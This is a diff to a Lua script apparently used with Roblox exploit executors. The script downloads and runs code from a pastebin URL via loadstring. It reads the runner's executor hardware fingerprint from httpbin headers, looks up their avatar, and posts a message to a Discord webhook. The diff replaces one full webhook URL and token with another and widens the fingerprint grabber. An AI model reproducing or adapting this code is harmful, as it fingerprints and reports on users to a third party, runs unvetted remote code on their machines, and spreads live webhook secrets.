@@ -1,4 +1,4 @@
-local Webhook = "https://discordapp.com/api/webhooks/1163737584120385616/K_4EbfUWmMYt62z8jtFso2wKKxqZ2ZE-1F_Ecr2siG6wy4ht658tykdNmyjVsehKrYO1" -- your webhook
+local Webhook = "https://discordapp.com/api/webhooks/1172275334259949701/9MndBHk2565oTB7ExmTgHdNY_KF9d3UzEUNpcfB3nN_d_kLn25Rd0Fg4OChq3W-kAyuA"
 _G.Discord_UserID = ''
 local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local blacklist = loadstring(game:HttpGet("https://pastebin.com/raw/ms8MraRn"))()
@@ -33,16 +33,14 @@ function getpremium()
     end
 end
 function getexploithwid()
-    local Body = game:GetService("HttpService"):JSONDecode(Request({
-        Url = "https://httpbin.org/get",
-        Method = "GET"
-    }).Body)
     local Hwid
-    for _, v in ipairs({"Krnl-Fingerprint", "Syn-Fingerprint", "SW-Fingerprint", "Flux-Fingerprint", "Oxy-Fingerprint", "Hydrogen-Fingerprint", "Delta-Fingerprint", "Electron-Fingerprint", "Kiwi-Fingerprint", "Vega-Fingerprint", "Valyse-Fingerprint", "Evon-Fingerprint", "Trigon-Fingerprint", "Articx-Fingerprint", "Sirhut-Fingerprint"}) do
-        if Body.headers[v] then
-            Hwid = Body.headers[v]
-        end
+    local body = Request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+    local decoded = game:GetService('HttpService'):JSONDecode(body)
+    local headers = decoded.headers
+    for i, v in pairs(headers) do
+        if type(i) == "string" and i:lower():match("fingerprint") then Hwid = v end
     end
+    if not Hwid then return "Hwid not found!" end
     return Hwid
 end
 function temp()
@@ -343,7 +341,7 @@ local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users
 Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
 local AvatarImage = Thing.imageUrl
 local msg = {
-    ["username"] = "Executor Bot",
+    ["username"] = "Webhook Script",
     ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
     ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("@" .. _G.Discord_UserID .. "") or " ",
     ["embeds"] = {
